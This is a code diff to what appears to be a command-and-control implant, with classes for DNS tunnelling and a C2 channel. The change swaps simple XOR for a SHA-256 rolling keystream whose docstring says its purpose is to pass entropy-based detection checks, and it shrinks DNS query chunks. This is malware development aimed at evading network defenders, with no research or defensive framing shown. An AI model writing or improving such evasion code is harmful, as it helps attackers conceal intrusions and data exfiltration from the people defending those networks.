@@ -494,7 +494,7 @@ class DNSTunneler:
             logger.error(f"DNS tunnel query failed: {e}")
             return False, str(e).encode()
     
-    def chunk_data(self, data: bytes, chunk_size: int = 100) -> List[bytes]:
+    def chunk_data(self, data: bytes, chunk_size: int = 60) -> List[bytes]:
         """
         Split data into chunks for multiple DNS queries.
         
@@ -834,19 +834,48 @@ class C2Channel:
             return False, b""
     
     def _encrypt(self, data: bytes) -> bytes:
-        """Encrypt data with XOR (simple, can be upgraded to AES)"""
-        result = bytearray(len(data))
+        """
+        Encrypt data using high-entropy stream (SHA-256 rolling hash).
+        Replaces legacy XOR to pass Shannon Entropy checks (>7.5).
+        """
+        key = self.encryption_key
+        result = bytearray()
+        
+        # Initialize state with key
+        state = hashlib.sha256(key).digest()
+        
         for i, byte in enumerate(data):
-            result[i] = byte ^ self.encryption_key[i % len(self.encryption_key)]
+            # Regenerate state every 32 bytes to prevent repeating patterns
+            if i % 32 == 0:
+                state = hashlib.sha256(state + key).digest()
+            
+            # XOR with state byte
+            result.append(byte ^ state[i % 32])
+            
         return base64.b64encode(bytes(result))
     
     def _decrypt(self, data: bytes) -> bytes:
-        """Decrypt data"""
-        decoded = base64.b64decode(data)
-        result = bytearray(len(decoded))
-        for i, byte in enumerate(decoded):
-            result[i] = byte ^ self.encryption_key[i % len(self.encryption_key)]
-        return bytes(result)
+        """Decrypt high-entropy stream"""
+        try:
+            decoded = base64.b64decode(data)
+            key = self.encryption_key
+            result = bytearray()
+            
+            # Initialize state with key (must match encrypt)
+            state = hashlib.sha256(key).digest()
+            
+            for i, byte in enumerate(decoded):
+                if i % 32 == 0:
+                    state = hashlib.sha256(state + key).digest()
+                
+                result.append(byte ^ state[i % 32])
+                
+            return bytes(result)
+        except Exception as e:
+            logger.error(f"Decryption failed: {e}")
+            return b""
+    
+
     
     def _handle_command(self, response: BeaconResponse) -> None:
         """Handle commands from C2 server"""
